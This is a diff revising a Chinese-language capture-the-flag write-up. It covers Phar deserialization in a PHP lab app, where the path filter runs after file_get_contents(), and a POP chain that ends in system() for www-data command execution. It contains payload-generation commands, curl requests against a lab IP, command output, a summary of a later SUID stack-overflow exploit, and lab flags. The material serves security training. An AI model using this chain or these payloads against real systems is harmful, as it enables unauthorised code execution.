@@ -139,7 +139,7 @@ public function repair(): void
 ```
 
 也就是说我们可以控制 `.bin` 文件的真实二进制内容。因为中间有一次 `rawurldecode()`，我们只要把二进制内容URL加密然后用`submit`写入，再触发`repair`，它会对我们的输入URL解码，此时内容就是原本的二进制内容，然后被写入`.bin`文件。
-# 文件读取点
+# Phar 触发点
 
 继续看 `Files.class.php`，这是最后一个功能点：
 
@@ -187,7 +187,7 @@ $this->filter();
 ```
 
 
-程序是先读文件，再过滤路径。过滤函数如下：
+程序是先执行 `file_get_contents()`，再过滤路径。过滤函数如下：
 
 ```php
 public function filter(): void
@@ -205,7 +205,7 @@ public function filter(): void
 
 但是它过滤得太晚了，他虽然会拦截并输出`not reasonable`，但是`file_get_contents()` 已经执行过了。
 
-于是我们可以利用 `phar://` 在过滤前触发 Phar  反序列化。（题目已经提示PHAR了所以想到了PHAR放序列化）
+所以这里不走普通文件读取路线，而是利用 `phar://` 在过滤前触发 Phar metadata 反序列化。（题目已经提示 PHAR，所以重点看这条链）
 
 # POP 链分析
 
@@ -223,7 +223,7 @@ Phar  unserialize
     -> ($level)($this->arg)
 ```
 
-我们先看最终的口子，也就是造成危害的点，（文件读取或命令执行），推荐先多注意一下魔术方法
+我们先看最终的口子，也就是造成危害的点，（命令执行），推荐先多注意一下魔术方法
 1. 这里并没有像eval()这种这么明显的点。但是我们能看到：
 ```php
  public function __get($key)
@@ -336,8 +336,8 @@ class Myerror
     public $level;
 }
 
-$func = $argv[1];   // readfile 或 system
-$arg  = $argv[2];   // 文件路径或命令
+$func = $argv[1];   // 这里直接传 system
+$arg  = $argv[2];   // 要执行的命令
 $out  = $argv[3];
 $tmp  = $out . '.phar';
 
@@ -389,12 +389,25 @@ file_put_contents($out . '.url', rawurlencode($data));
 本地生成时要关掉 `phar.readonly`：
 
 ```bash
-php -d phar.readonly=0 make_phar_payload.php readfile /etc/passwd poc.bin
+php -d phar.readonly=0 make_phar_payload.php system id poc.bin
 ```
 
 生成出来的 `poc.bin.url` 是 URL 编码后的 Phar 二进制，拿它去提交。
 
-# 任意文件读取拿 user.txt
+# 直接 getshell（www-data RCE）
+
+这里直接把 POP 链最终调用点换成 `system`。真正执行的是：
+
+```php
+($key)($this->arg);
+```
+
+只要 `$key` 是合法函数名，就可以变成 `system($arg)`。所以 payload 参数直接是：
+
+```text
+level = system
+arg   = id
+```
 
 先登录：
 
@@ -432,47 +445,12 @@ curl -c cookie.txt -b cookie.txt -X POST \
 /var/labdata/archive/06964165cfa2553046f76ee731d289c9.bin
 ```
 
-最后通过 `Files::read()` 触发：
+最后通过 `Files::read()` 触发 `phar://`，这里只把它当作 Phar metadata 触发器：
 
 ```bash
 curl -c cookie.txt -b cookie.txt -X POST \
   --data-urlencode 'file=phar:///var/labdata/archive/06964165cfa2553046f76ee731d289c9.bin/x.txt' \
   'http://192.168.56.109/?c=Files&m=read'
-```
-
-先读 `/etc/passwd`，可以看到真实用户：
-
-```text
-welcome:x:1000:1000:welcome,,,:/home/welcome:/bin/bash
-```
-
-所以继续把 payload 的读取目标改成：
-
-```text
-/home/welcome/user.txt
-```
-
-最终读到：
-
-```text
-flag{user-1e34287df8a27d2bbfa5ff51abb3d2ff}not reasonable
-```
-
-后面的 `not reasonable` 是过滤器输出的报错，不影响前面的文件内容。
-
-# 从文件读取到 RCE
-
-刚才的 POP 链不只能读文件，因为真正执行的是：
-
-```php
-($key)($this->arg);
-```
-
-只要 `$key` 是合法函数名，就可以换成 `system`。所以把 payload 改成：
-
-```text
-level = system
-arg   = id
 ```
 
 触发后回显：
@@ -482,7 +460,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 not reasonable
 ```
 
-说明已经拿到 `www-data` 的命令执行。
+说明已经拿到 `www-data` 的命令执行。`not reasonable` 是后置过滤器的输出，不影响前面的命令结果。
 
 为了后面枚举方便，可以写一个简单的 RCE 调用器，自动完成：登录、提交 payload、repair、phar 触发。
 
@@ -908,8 +886,7 @@ flag{root-a5e1f6d2cd2448650c88a8985cfb6365}
 -> Files::read 先 file_get_contents 后 filter
 -> phar:// 触发 Phar metadata 反序列化
 -> User / Myerror / Files 组成 POP 链
--> readfile('/home/welcome/user.txt') 拿 user flag
--> 把 readfile 换成 system 拿 www-data RCE
+-> POP 链最终调用 system 拿 www-data RCE
 -> 枚举 SUID 发现 /opt/vaultd
 -> support_ticket 格式化字符串泄露 canary
 -> restore_recipe 栈溢出 ret2win
@@ -930,6 +907,5 @@ flag{root-a5e1f6d2cd2448650c88a8985cfb6365}
 最终 flag：
 
 ```text
-user: flag{user-1e34287df8a27d2bbfa5ff51abb3d2ff}
 root: flag{root-a5e1f6d2cd2448650c88a8985cfb6365}
 ```
